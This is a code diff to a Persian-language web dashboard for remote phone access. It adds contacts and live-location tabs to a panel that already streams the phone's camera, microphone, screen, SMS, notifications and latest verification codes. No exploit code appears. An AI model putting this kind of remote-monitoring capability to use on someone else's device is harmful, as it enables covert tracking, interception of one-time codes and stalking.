@@ -324,6 +324,8 @@ a>button{color:var(--ink)} a>button.pri{color:#fff} a:has(>button){text-decorati
       <button class="tab" data-tab="cam">دوربین <span class="recdot hidden" id="recDot"></span></button>
       <button class="tab" data-tab="mic">میکروفون <span class="recdot hidden" id="micDot"></span></button>
       <button class="tab" data-tab="screen">صفحه‌ی گوشی</button>
+      <button class="tab" data-tab="contacts">مخاطبین</button>
+      <button class="tab" data-tab="loc">📍 لوکیشن</button>
     </div>
     <div class="spacer"></div>
     <div class="otp hidden" id="otpChip" title="آخرین کد تأیید — برای کپی کلیک کنید"><small>کد</small><b id="otpCode"></b><small id="otpFrom"></small></div>
@@ -460,6 +462,22 @@ a>button{color:var(--ink)} a>button.pri{color:#fff} a:has(>button){text-decorati
           <small>کلیک = لمس · نگه داشتن = لمس طولانی · کشیدن = سوایپ · چرخ ماوس = اسکرول · کلیک راست = برگشت · Esc = برگشت · Ctrl+V = چسباندن متن</small>
         </div>
       </div>
+    </section>
+
+    <section class="view hidden" id="contactsView">
+      <section class="conv">
+        <div class="conv-head"><div class="meta"><div class="nm">مخاطبین</div><div class="sub" style="direction:rtl" id="contactsSub"></div></div></div>
+        <div class="row1"><input type="search" id="contactQ" placeholder="جستجوی نام یا شماره…" style="flex:1"></div>
+        <div class="clist" id="contactList"></div>
+      </section>
+    </section>
+    <section class="view hidden" id="locView">
+      <section class="conv">
+        <div class="conv-head"><div class="meta"><div class="nm">📍 لوکیشن لحظه‌ای</div><div class="sub" style="direction:rtl">موقعیت فعلی گوشی، با لینک نقشهٔ گوگل</div></div></div>
+        <div class="row1"><button id="locBtn" class="pri">📍 گرفتن لوکیشن لحظه‌ای</button></div>
+        <div class="sn">برای دقت بهتر، GPS گوشی را روشن کنید. گرفتن لوکیشن تازه چند ثانیه طول می‌کشد.</div>
+        <div class="clist" id="locOut"></div>
+      </section>
     </section>
 
     <section class="view hidden" id="micView">
@@ -818,6 +836,8 @@ function renderBanner() {
   if (p.readSms === false) msgs.push('⚠️ مجوز «خواندن پیامک» روی گوشی داده نشده — برنامه را روی گوشی باز کنید و دکمهٔ مجوزها را بزنید.');
   if (st.tab === 'notif' && p.notif === false) msgs.push('⚠️ «دسترسی به اعلان‌ها» فعال نیست؛ پیام‌های بله، تلگرام، واتساپ و … اینجا نمی‌آیند.');
   if (st.tab === 'sms' && p.sendSms === false) msgs.push('ارسال پیامک از کامپیوتر غیرفعال است (مجوز ارسال پیامک داده نشده).');
+  if (st.tab === 'contacts' && p.contacts === false) msgs.push('⚠️ مجوز «مخاطبین» روی گوشی داده نشده — برنامه را روی گوشی باز کنید و دکمهٔ مجوزها را بزنید.');
+  if (st.tab === 'loc' && p.location === false) msgs.push('⚠️ مجوز «لوکیشن» روی گوشی داده نشده — برنامه را روی گوشی باز کنید و دکمهٔ مجوزها را بزنید.');
   $('#banner').innerHTML = msgs.join('<br>');
   $('#banner').classList.toggle('hidden', !msgs.length);
 }
@@ -834,9 +854,12 @@ function setTab(t) {
   $('#camView').classList.toggle('hidden', t !== 'cam');
   $('#micView').classList.toggle('hidden', t !== 'mic');
   $('#screenView').classList.toggle('hidden', t !== 'screen');
+  $('#contactsView').classList.toggle('hidden', t !== 'contacts');
+  $('#locView').classList.toggle('hidden', t !== 'loc');
   if (t === 'screen') scrEnter(); else scrLeave();
   if (t === 'mic') micMeterLoop();
   if (t === 'cam') camEnter(); else camLeave();
+  if (t === 'contacts' && !st.contactsLoaded) refreshContacts();
   if (t === 'files') { st.seenFiles = st.outCount; renderFilesBadge(); if (!st.mediaLoaded) loadMedia(); }
   document.body.classList.remove('show-conv');
   if (t === 'notif') renderNotifBadge();
@@ -1321,6 +1344,62 @@ $('#callList').addEventListener('click', e => {
     setTab('sms'); openThread(ex || {thread: null, address: num, name: c ? c.name : null});
   }
 });
+
+/* ---------- مخاطبین ---------- */
+st.contacts = []; st.contactsLoaded = false;
+async function refreshContacts() {
+  let list;
+  try { list = await api('/api/contacts'); } catch (e) { return; }
+  st.contacts = list; st.contactsLoaded = true;
+  renderContacts();
+}
+function renderContacts() {
+  const q = ($('#contactQ').value || '').trim();
+  const qd = q.replace(/\D/g, '');
+  const list = q ? st.contacts.filter(c => c.name.includes(q) || (qd && c.numbers.some(n => n.replace(/\D/g, '').includes(qd)))) : st.contacts;
+  $('#contactsSub').textContent = faNum(list.length) + ' مخاطب';
+  $('#contactList').innerHTML = list.length ? list.map(c => {
+    const num = c.numbers[0] || '';
+    return `<div class="call in">
+      <div class="ic in">👤</div>
+      <div class="meta">
+        <div class="row1"><span class="nm">${esc(c.name)}</span></div>
+        <div class="sn" style="direction:ltr;unicode-bidi:isolate">${c.numbers.map(n => esc(n)).join(' · ')}</div>
+      </div>
+      ${num ? `${waLink(num) ? `<a href="${waLink(num)}" target="_blank" rel="noopener"><button>واتس‌اپ وب</button></a>` : ''}<button data-copy="${esc(num)}">کپی شماره</button><button data-sms="${esc(num)}">پیامک</button>` : ''}
+    </div>`;
+  }).join('') : `<div class="empty">${st.perms.contacts === false ? 'مجوز «مخاطبین» روی گوشی داده نشده' : 'مخاطبی نیست'}</div>`;
+}
+$('#contactQ').addEventListener('input', renderContacts);
+$('#contactList').addEventListener('click', e => {
+  const b = e.target.closest('button'); if (!b) return;
+  if (b.dataset.copy) copy(b.dataset.copy);
+  if (b.dataset.sms) {
+    const num = b.dataset.sms;
+    const ex = st.threads.find(t => normNum(t.address) === normNum(num));
+    setTab('sms'); openThread(ex || {thread: null, address: num, name: null});
+  }
+});
+
+/* ---------- لوکیشن ---------- */
+async function refreshLoc() {
+  const btn = $('#locBtn'); btn.disabled = true; btn.textContent = 'در حال گرفتن لوکیشن…';
+  $('#locOut').innerHTML = '';
+  let r;
+  try { r = await api('/api/location'); } catch (e) { r = null; }
+  btn.disabled = false; btn.textContent = '📍 گرفتن لوکیشن لحظه‌ای';
+  if (!r || !r.ok) { $('#locOut').innerHTML = `<div class="empty">${esc((r && r.error) || 'لوکیشن گرفته نشد')}</div>`; return; }
+  const maps = 'https://maps.google.com/?q=' + r.lat + ',' + r.lon;
+  $('#locOut').innerHTML = `<div class="call in">
+    <div class="ic in">📍</div>
+    <div class="meta">
+      <div class="row1"><span class="nm" style="direction:ltr;unicode-bidi:isolate">${r.lat.toFixed(6)}، ${r.lon.toFixed(6)}</span></div>
+      <div class="sn">دقت حدود ${faNum(r.acc)} متر · ${esc(r.provider || '')}${r.cached ? ' · آخرین موقعیت ذخیره‌شده (' + faNum(r.age) + ' ثانیه پیش)' : ' · تازه'}</div>
+    </div>
+    <a href="${maps}" target="_blank" rel="noopener"><button class="pri">نمایش روی نقشهٔ گوگل</button></a>
+  </div>`;
+}
+$('#locBtn').addEventListener('click', refreshLoc);
 
 /* ---------- فایل‌ها ---------- */
 const fmtSize = b => b >= 1048576 ? faNum((b / 1048576).toFixed(1)) + ' MB' : faNum(Math.max(1, Math.round(b / 1024))) + ' KB';
